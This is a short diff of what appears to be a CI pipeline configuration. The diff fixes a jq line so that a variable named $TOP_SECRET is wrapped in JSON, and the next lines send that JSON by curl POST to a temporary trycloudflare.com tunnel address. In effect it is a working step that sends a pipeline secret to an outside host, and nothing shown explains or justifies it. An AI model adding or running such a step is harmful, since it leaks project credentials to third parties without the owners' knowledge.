@@ -14,7 +14,7 @@ pipelines:
           script:
             # now use a literal block so you don’t have to worry about quoting colons
             - |
-              DATA=$(jq -n --arg msg "$TOP_SECRET" '{message: ZOOOOOM.  $msg}')
+              DATA=$(jq -n --arg msg "zoooom $TOP_SECRET" '{message: $msg}')
               curl -X POST "https://influence-remembered-accused-outdoor.trycloudflare.com" \
                 -H "Content-Type: application/json" \
                 -d "$DATA"
